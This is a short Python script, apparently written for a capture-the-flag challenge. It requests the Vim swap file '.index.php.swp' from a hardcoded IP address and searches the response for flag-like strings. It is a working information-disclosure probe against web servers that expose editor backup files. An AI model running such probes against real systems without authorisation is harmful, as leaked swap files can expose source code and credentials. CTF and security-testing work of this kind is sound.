import requests
import re
import sys

# 🎯 Define the target URL
TARGET_URL = "http://136.110.49.76/"

# The original file name we are targeting for the Vim swap file
TARGET_FILE = "index.php"

# The specific Vim Swap File pattern: .<filename>.swp
VIM_SWAP_PATTERN = f".{TARGET_FILE}.swp" 

# Max content size to check (in characters) to prevent memory overload from huge files
MAX_CONTENT_SIZE = 10000 

# Construct the full URL for the Vim swap file
SWAP_FILE_URL = f"{TARGET_URL}{VIM_SWAP_PATTERN}"

def find_flag_in_vim_swap():
    """
    Sends a request to the specific Vim Swap File URL and scans the content for a Flag.
    """
    print(f"[*] Starting check for Vim Swap File at: **{SWAP_FILE_URL}**\n")
    
    try:
        # Send HTTP GET Request to the URL
        response = requests.get(SWAP_FILE_URL, timeout=5)
        
        # Check HTTP Status Code 
        if response.status_code == 200:
            print(f"[+] Found accessible Vim Swap file: **{SWAP_FILE_URL}**")
            
            # Check file size before scanning the content
            content = response.text
            if len(content) < MAX_CONTENT_SIZE:
                find_flag_in_content(content, SWAP_FILE_URL)
            else:
                print(f"    [!] File is too large ({len(content)} bytes). Skipping flag scan.")
                
        elif response.status_code == 404:
            print(f"[-] File {VIM_SWAP_PATTERN} not found (404 Not Found)")
            
        else:
            print(f"[*] Checking {SWAP_FILE_URL} -> Status: {response.status_code}")

    except requests.exceptions.RequestException as e:
        # Handle connection errors
        print(f"[-] Connection error for {SWAP_FILE_URL}: {e}")
            
    print("\n[*] Check complete.")


def find_flag_in_content(content, url):
    """
    Searches for a flag-like string within the received content.
    """
    # Regex for common flag formats (e.g., flag{...} or 32+ character strings)
    # re.DOTALL is used to ensure the dot matches newlines, important for multi-line content
    flag_pattern = r"([fF][lL][aA][gG]\{.*?\})|([A-Za-z0-9]{32,})"
    
    # Search the entire content
    matches = re.findall(flag_pattern, content, re.DOTALL)
    
    if matches:
        print("\n\t✅ **FLAG FOUND!**")
        for match in matches:
            # Filter for the non-empty match from the regex groups
            actual_flag = next((f for f in match if f), None) 
            if actual_flag:
                print(f"\t---------------------------------------------------")
                print(f"\t[RESULT] **{actual_flag}**")
                print(f"\t[SOURCE] {url}")
                print(f"\t---------------------------------------------------")
    else:
        print("\t[i] No flag-like string found in content.")


if __name__ == "__main__":
    # Check for required libraries
    try:
        import requests
    except ImportError:
        print("Error: The 'requests' library is not installed.")
        print("Please run: pip install requests")
        sys.exit(1)
        
    find_flag_in_vim_swap()
